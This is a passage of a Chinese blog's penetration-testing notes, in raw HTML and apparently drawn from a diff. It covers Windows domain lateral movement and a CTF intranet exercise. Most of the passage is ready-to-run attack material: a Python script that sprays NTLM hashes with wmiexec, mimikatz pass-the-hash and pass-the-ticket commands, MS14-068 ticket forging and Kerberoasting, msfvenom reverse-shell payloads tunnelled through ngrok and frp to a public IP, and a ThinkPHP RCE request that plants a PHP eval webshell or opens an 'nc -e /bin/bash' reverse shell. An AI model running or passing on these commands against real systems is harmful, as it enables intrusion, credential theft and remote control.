class="hljs-number">6485269</span><span class="hljs-keyword">c</span><span class="hljs-number">20</span>db<span class="hljs-number">2</span>cad<span class="hljs-number">21734</span>fe<span class="hljs-number">7</span> god/administrator<span class="hljs-title">@192</span>.<span class="hljs-number">168.3</span>.<span class="hljs-number">21</span> <span class="hljs-string">&quot;whoami&quot;</span><br><br>LLVM<br></code></pre></td></tr></table></figure>
+
+<h3 id="12-域横向移动以上服务-hash-批量利用-python-编译-exe"><a href="#12-域横向移动以上服务-hash-批量利用-python-编译-exe" class="headerlink" title="12.域横向移动以上服务 hash 批量利用-python 编译 exe"></a>12.域横向移动以上服务 hash 批量利用-python 编译 exe</h3><p>pyinstaller.exe -F fuck_neiwang_002.py</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs nsis">import os,time<br><br>ips=&#123;<br><br>    <span class="hljs-string">&#x27;192.168.3.21&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.25&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.29&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.30&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;192.168.3.32&#x27;</span><br><br>&#125;<br><br>users=&#123;<br><br>    <span class="hljs-string">&#x27;Administrator&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;boss&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;dbadmin&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;fileadmin&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;mack&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;mary&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;webadmin&#x27;</span><br><br>&#125;<br><br>hashs=&#123;<br><br>    <span class="hljs-string">&#x27;ccef208c6485269c20db2cad21734fe7&#x27;</span>,<br><br>    <span class="hljs-string">&#x27;518b98ad4178a53695dc997aa02d455c&#x27;</span><br><br>&#125;<br><br>for ip in ips:<br><br>    for <span class="hljs-literal">user</span> in users:<br><br>        for mimahash in hashs:<br><br>            \<span class="hljs-comment">#wmiexec -hashes :hashgod/user@ipwhoami</span><br><br>            <span class="hljs-keyword">exec</span> = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot; god/&quot;</span>+<span class="hljs-literal">user</span>+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot; whoami&quot;</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + <span class="hljs-keyword">exec</span> + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(<span class="hljs-keyword">exec</span>)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.5</span>) <br><br>            exec1 = <span class="hljs-string">&quot;wmiexec -hashes :&quot;</span>+mimahash+<span class="hljs-string">&quot; god/&quot;</span>+<span class="hljs-literal">user</span>+<span class="hljs-string">&quot;@&quot;</span>+ip+<span class="hljs-string">&quot; whoami&quot;</span><br><br>            <span class="hljs-literal">print</span>(<span class="hljs-string">&#x27;---&gt;&#x27;</span> + exec1 + <span class="hljs-string">&#x27;&lt;---&#x27;</span>)<br><br>            os.<span class="hljs-params">system</span>(exec1)<br><br>            time.<span class="hljs-keyword">sleep</span>(<span class="hljs-number">0.5</span>)<br><br>NSIS<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1631612310522-a9de1557-6b29-415c-9bec-3d4fecf33e11.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1631612310522-a9de1557-6b29-415c-9bec-3d4fecf33e11.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>image.png</p>
+<h3 id="13-域横向移动-PTH-传递-mimikatz"><a href="#13-域横向移动-PTH-传递-mimikatz" class="headerlink" title="13.域横向移动 PTH 传递-mimikatz"></a>13.域横向移动 PTH 传递-mimikatz</h3><p>PTH ntlm 传递</p>
+<p>未打补丁下的工作组及域连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7<br>sekurlsa::pth /user:administrator /domain:workgroup /ntlm:518b98ad4178a53695dc997aa02d455c<br>sekurlsa::pth /user:boss /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7<br>net use \\192.168.3.21\c$<br><span class="hljs-built_in">dir</span> \\192.168.3.21\c$<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<h3 id="14-域横向移动-PTK-传递-mimikatz"><a href="#14-域横向移动-PTK-传递-mimikatz" class="headerlink" title="14.域横向移动 PTK 传递-mimikatz"></a>14.域横向移动 PTK 传递-mimikatz</h3><p>PTK aes256 传递</p>
+<p>打补丁后的工作组及域连接：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">sekurlsa::pth /user:mary /domain:god /aes256:d7c1d9310753a2f7f240e5b2701dc1e6177d16a6e40af3c5cdff814719821c4b<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<h3 id="15-域横向移动-PTT-传递-ms14068-kekeo-本地"><a href="#15-域横向移动-PTT-传递-ms14068-kekeo-本地" class="headerlink" title="15.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地"></a>15.域横向移动 PTT 传递-ms14068&amp;kekeo&amp;本地</h3><p>类比Cookies</p>
+<p>第一种利用漏洞：能实现普通用户直接获取域控 system 权限</p>
+<p>MS14-068 powershell 执行</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 查看当前 sid </span><br><span class="hljs-attribute">whoami</span>/user<br><br><span class="hljs-comment"># 查看凭证列表</span><br><span class="hljs-attribute">klist</span><br><br><span class="hljs-comment"># 查看当前机器凭证</span><br><span class="hljs-attribute">kerberos</span>::list<br><br><span class="hljs-comment"># mimikatz 清空当前机器中所有凭证，如果有域成员凭证会影响凭证伪造</span><br><span class="hljs-attribute">kerberos</span>::purge<br><br><span class="hljs-comment"># 删除所有凭证</span><br><span class="hljs-attribute">klist</span> purge<br><br><span class="hljs-comment"># 利用 ms14-068 生成 TGT 数据</span><br><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>.exe -u 域成员名@域名 -s sid -d 域控制器地址 -p 域成员密码<br><span class="hljs-attribute">MS14</span>-<span class="hljs-number">068</span>.exe -u mary@god.org -s S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">1218902331</span> -<span class="hljs-number">2157346161</span>-<span class="hljs-number">1782232778</span>-<span class="hljs-number">1124</span> -d <span class="hljs-number">192.168.3.21</span> -p admin!@#<span class="hljs-number">45</span><br><br><span class="hljs-comment"># 将票据注入到内存中</span><br><span class="hljs-attribute">kerberos</span>::ptc 票据文件<br><span class="hljs-attribute">mimikatz</span>.exe <span class="hljs-string">&quot;kerberos::ptc TGT_mary@god.org.ccache&quot;</span> exit<br><br><span class="hljs-comment"># 查看域名</span><br><span class="hljs-attribute">net</span> time /domain<br><br><span class="hljs-comment"># 利用</span><br><span class="hljs-attribute">dir</span> \\OWA20210CN-God.god.org\c$<br><br><span class="hljs-attribute">POWERSHELL</span><br></code></pre></td></tr></table></figure>
+
+<p>第二种利用工具 kekeo</p>
+<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-meta"># 生成票据</span><br>kekeo <span class="hljs-string">&quot;tgt::ask /user:mary /domain:god.org /ntlm:518b98ad4178a53695dc997aa02d455c&quot;</span><br><br><span class="hljs-meta"># 导入票据</span><br><span class="hljs-symbol">kerberos:</span>:ptt TGT_mary@GOD.ORG_krbtgt~god<span class="hljs-meta">.org</span>@GOD<span class="hljs-meta">.ORG</span>.kirbi<br><br><span class="hljs-meta"># 查看凭证</span><br>klist<br><br><span class="hljs-meta"># 利用 net use 载入</span><br>dir \\OWA20210CN-God.god<span class="hljs-meta">.org</span>\c$<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>第三种利用本地票据(需管理权限)</p>
+<p>前提是之前连接过，所以有本地票据，但是票据会过期，有时间限制（10小时）</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs cpp">privilege::debug<br>sekurlsa::tickets /<span class="hljs-keyword">export</span><br>kerberos::ptt xxxxxxxxxx.xxxx.kirbi<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>总结：ptt 传递不需本地管理员权限，连接时主机名连接，基于漏洞,工具,本地票据</p>
+<h3 id="16-国产-Ladon-内网杀器测试验收"><a href="#16-国产-Ladon-内网杀器测试验收" class="headerlink" title="16.国产 Ladon 内网杀器测试验收"></a>16.国产 Ladon 内网杀器测试验收</h3><p>信息收集-协议扫描-漏洞探针-传递攻击等</p>
+<h3 id="17-域横向移动RDP传递-Mimikatz"><a href="#17-域横向移动RDP传递-Mimikatz" class="headerlink" title="17.域横向移动RDP传递-Mimikatz"></a>17.域横向移动RDP传递-Mimikatz</h3><p>除了上述讲到的IPC，WMI，SMB等协议的链接外，获取到的明文密码或HASH密文也可以通过RDP协议进行链接操作</p>
+<p>RDP协议连接：判断对方远程桌面服务是否开启（默认：3389），端口扫描判断</p>
+<p>RDP明文密码链接</p>
+<p>Windows：</p>
+<p>mstsc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">mstsc.exe /console /v:192.168.3.21 /admin<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>Linux:</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rdesktop</span> <span class="hljs-number">192.168.3.21:3389</span><br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>RDP密文HASH链接</p>
+<p>windows Server需要开启 Restricted Admin mode，在Windows 8.1和Windows Server 2012 R2中默认开启，同时如果Win 7 和Windows Server 2008 R2安装了2871997、2973351补丁也支持；开启命令：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs dockerfile">REG <span class="hljs-keyword">ADD</span><span class="language-bash"> “HKLM\System\CurrentControlSet\Control\Lsa” /v DisableRestrictedAdmin /t REG_DWORD /d 00000000 /f</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>开启后运行：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">mstsc.exe /restrictedadmin<br>mimikatz.exe<br>privilege::debug<br>sekurlsa::pth /user:administrator /domain:god /ntlm:ccef208c6485269c20db2cad21734fe7 “/run:mstsc.exe /restrictedadmin”<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<h3 id="18-域横向移动SPN服务-探针-请求-破解-重写"><a href="#18-域横向移动SPN服务-探针-请求-破解-重写" class="headerlink" title="18.域横向移动SPN服务-探针,请求,破解,重写"></a>18.域横向移动SPN服务-探针,请求,破解,重写</h3><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/backlion/p/8082623.html">https://www.cnblogs.com/backlion/p/8082623.html</a></p>
+<p>黑客可以使用有效的域用户的身份验证票证（TGT）去请求运行在服务器上的一个或多个目标服务的服务票证。DC在活动目录中查找SPN，并使用与SPN关联的服务帐户加密票证，以便服务能够验证用户是否可以访问。请求的Kerberos服务票证的加密类型是RC4_HMAC_MD5，这意味着服务帐户的NTLM密码哈希用于加密服务票证。黑客将收到的TGS票据离线进行破解，即可得到目标服务帐号的HASH，这个称之为Kerberoast攻击。如果我们有一个为域用户帐户注册的任意SPN，那么该用户帐户的明文密码的NTLM哈希值就将用于创建服务票证。这就是Kerberoasting攻击的关键。</p>
+<p>探针</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs 1c">setspn -q */*<br>setspn -q */* <span class="hljs-string">| findstr &quot;</span>MSSQL<span class="hljs-string">&quot;</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>请求</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">Add</span>-<span class="hljs-keyword">Type</span> -AssemblyName <span class="hljs-keyword">System</span>.IdentityModel<br><br><span class="hljs-built_in">New</span>-<span class="hljs-keyword">Object</span> <span class="hljs-keyword">System</span>.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList &quot;xxxx&quot;<br><br>mimikatz.exe &quot;kerberos::ask /target:xxxx&quot;<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>导出</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">mimikatz<span class="hljs-selector-class">.exe</span> <span class="hljs-string">&quot;kerberos::list /export&quot;</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>破解</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">python tgsrepcrack<span class="hljs-selector-class">.py</span> passwd<span class="hljs-selector-class">.txt</span> xxxx<span class="hljs-selector-class">.kirbi</span><br><br>python3 .\tgsrepcrack<span class="hljs-selector-class">.py</span> .\password<span class="hljs-selector-class">.txt</span> .\<span class="hljs-number">1</span>-<span class="hljs-number">40</span>a00000-jerry@MSSQLSvc~Srv-DB-<span class="hljs-number">0</span>day.<span class="hljs-number">0</span>day.org~<span class="hljs-number">1433</span>-<span class="hljs-number">0</span>DAY<span class="hljs-selector-class">.ORG</span><span class="hljs-selector-class">.kirbi</span><br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p>重写</p>
+<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs vim"><span class="hljs-keyword">python</span> kerberoast.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">p</span> Password123 -r xxxx.kirbi -<span class="hljs-keyword">w</span> PENTESTLAB.kirbi -<span class="hljs-keyword">u</span> <span class="hljs-number">500</span><br><br><span class="hljs-keyword">python</span> kerberoast.<span class="hljs-keyword">py</span> -<span class="hljs-keyword">p</span> Password123 -r xxxx.kirbi -<span class="hljs-keyword">w</span> PENTESTLAB.kirbi -g <span class="hljs-number">512</span><br><br>mimikatz.<span class="hljs-keyword">exe</span> kerberos::ptt xxxx.kirbi # 将生成的票据注入内存<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<h3 id="19-域横向移动测试流程一把梭哈-CobaltStrike初体验"><a href="#19-域横向移动测试流程一把梭哈-CobaltStrike初体验" class="headerlink" title="19.域横向移动测试流程一把梭哈-CobaltStrike初体验"></a>19.域横向移动测试流程一把梭哈-CobaltStrike初体验</h3><p>参考：【腾讯文档】第五十二天：Cobalt Strike使用指南</p>
+<p><a target="_blank" rel="noopener" href="https://docs.qq.com/doc/DZlVaY3dzWlpRZlh3">https://docs.qq.com/doc/DZlVaY3dzWlpRZlh3</a></p>
+<p>大概流程：</p>
+<p>启动-配置-监听-执行-上线-提权-信息收集(网络,凭证,定位等)-渗透</p>
+<p>1.关于启动及配置讲解</p>
+<p>2.关于提权及插件加载</p>
+<p>3.关于信息收集命令讲解</p>
+<p>4.关于视图自动化功能讲解</p>
+<figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs stata">iew<br><br><span class="hljs-keyword">net</span> computer<br><br><span class="hljs-keyword">net</span> dclist <br><br><span class="hljs-keyword">shell</span> <span class="hljs-keyword">net</span> user /domain<br><br>POWERSHELL<br></code></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1633082373154-ffa7b109-6ace-41f5-a049-838bb9ff396a.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1633082373154-ffa7b109-6ace-41f5-a049-838bb9ff396a.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>image.png</p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1633082376650-a7662dfd-7a4c-44a6-9365-2d94a0fd8aca.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1633082376650-a7662dfd-7a4c-44a6-9365-2d94a0fd8aca.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>image.png</p>
+<h3 id="20-内网穿透-Ngrok-测试演示-两个内网通讯上线"><a href="#20-内网穿透-Ngrok-测试演示-两个内网通讯上线" class="headerlink" title="20.内网穿透 Ngrok 测试演示-两个内网通讯上线"></a>20.内网穿透 Ngrok 测试演示-两个内网通讯上线</h3><p>实验环境：两个不同的内网(有网络)实现穿透控制</p>
+<p>1.注册-购买-填写-确认</p>
+<p><a target="_blank" rel="noopener" href="http://www.ngrok.cc/">http://www.ngrok.cc/</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.natfrp.com/">https://www.natfrp.com/</a></p>
+<p>协议：http 本地端口：192.168.76.132:4444</p>
+<p>2.测试：内网 1 执行后门-免费主机处理-内网 2 监听-内网 2 接受器</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">./sunny clientid aa0676878c162ffc<br>msfvenom -p windows/meterpreter/reverse_http <span class="hljs-attribute">lhost</span>=xiaodisec.free.idcfengye.com <span class="hljs-attribute">lport</span>=80 -f exe -o test.exe<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http<br><span class="hljs-built_in">set</span> lhost 192.168.76.132<br><span class="hljs-built_in">set</span> lport 4444<br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<h3 id="21-内网穿透-Frp-自建跳板测试-两个内网通讯上线"><a href="#21-内网穿透-Frp-自建跳板测试-两个内网通讯上线" class="headerlink" title="21.内网穿透 Frp 自建跳板测试-两个内网通讯上线"></a>21.内网穿透 Frp 自建跳板测试-两个内网通讯上线</h3><p>自行搭建，方便修改，成本低，使用多样化，适合高富帅及隐私哥哥们</p>
+<p>1.服务端-下载-解压-修改-启动（阿里云主机记得修改安全组配置出入口）</p>
+<p>服务器修改配置文件 frps.ini：</p>
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs abnf">[common]<br>bind_port <span class="hljs-operator">=</span> <span class="hljs-number">6677</span><br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>启动服务端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frps -c ./frps.ini<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>2.控制端-下载-解压-修改-启动</p>
+<p>控制端修改配置文件 frpc.ini：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[common]<br>server_addr = 你的云主机 ip<br>server_port = 6677 <span class="hljs-comment">#frpc 工作端口，必须和上面 frps 保持一致</span><br>[msf]<br>type = tcp<br>local_ip = 127.0.0.1<br>local_port = 5555 <span class="hljs-comment">#转发给本机的 5555</span><br>remote_port = 6000 <span class="hljs-comment">#服务端用 6000 端口转发给本机</span><br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>启动客户端：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">./frpc -c ./frpc.ini<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>生成后门</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/meterpreter/reverse_tcp <span class="hljs-attribute">lhost</span>=101.37.160.211 <span class="hljs-attribute">lport</span>=6000 -f exe -o frp.exe<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 127.0.0.1<br><span class="hljs-built_in">set</span> LPORT 5555<br>exploit<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>3.靶机运行 frp 即可</p>
+<h3 id="22-CFS-三层内网漫游安全测试演练-某-CTF-线下-2019"><a href="#22-CFS-三层内网漫游安全测试演练-某-CTF-线下-2019" class="headerlink" title="22.CFS 三层内网漫游安全测试演练-某 CTF 线下 2019"></a>22.CFS 三层内网漫游安全测试演练-某 CTF 线下 2019</h3><p>来源 2019 某 CTF 线下赛真题内网结合 WEB 攻防题库，涉及 WEB 攻击，内网代理路由等技术，每台服务器存在一个 Flag，获取每一个 Flag 对应一个积分，获取三个 Flag 结尾。</p>
+<p>本地测试基础环境</p>
+<table>
+<thead>
+<tr>
+<th>名称</th>
+<th>网卡1</th>
+<th>网卡2</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>kali</td>
+<td>192.168.229.143</td>
+<td></td>
+</tr>
+<tr>
+<td>Target1</td>
+<td>192.168.1.128</td>
+<td>192.168.22.128</td>
+</tr>
+<tr>
+<td>Target2</td>
+<td></td>
+<td></td>
+</tr>
+</tbody></table>
+<p>Target1：192.168.1.128</p>
+<p>探针目标-利用 WEB 漏洞(TP5_RCE)-获取 webshell 权限-获取 Flag-Target2</p>
+<p>0.Getshell</p>
+<p>方法一 ：<a target="_blank" rel="noopener" href="https://github.com/Lotus6/ThinkphpGUI/releases/tag/1.2">ThinkPHP getshell工具</a></p>
+<p><a target="_blank" rel="noopener" href="https://xiaojun88.github.io/2022/09/26/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E7%AC%94%E8%AE%B0/1634029248272-10cfa245-2cde-465d-82c1-f46cca9e61c7.png"><img src="D:\blog2\source_posts\内网渗透笔记.assets\1634029248272-10cfa245-2cde-465d-82c1-f46cca9e61c7.png" srcset="/img/loading.gif" lazyload alt="image.png"></a></p>
+<p>image.png</p>
+<p>方法二：手动Getshell</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php">编码前：<br><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]);<span class="hljs-meta">?&gt;</span><br>编码后：<br>PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=<br>POC:<br>http:<span class="hljs-comment">//192.168.1.128/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=echo &quot;PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7Pz4=&quot;|base64 -d &gt; cmd.php</span><br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>方法三：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://192.168.1.128/index.php?s=index/think\app/invokefunction&amp;function=call_user_func_array&amp;vars</span>[<span class="hljs-string">0</span>]=system&amp;vars[1][]=nc 192.168.229.143 6666 -e /bin/bash <br><br>KALI：nc -lnvp 6666<br>目标：nc 192.168.229.143 6666 -e /bin/bash<br><br>python -c <span class="hljs-emphasis">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>1.生成后门：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p linux/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=192.168.229.143 <span class="hljs-attribute">LPORT</span>=1111 -f elf &gt;t1.elf<br><br>SHELL<br></code></pre></td></tr></table></figure>
+
+<p>2.接受反弹：</p>
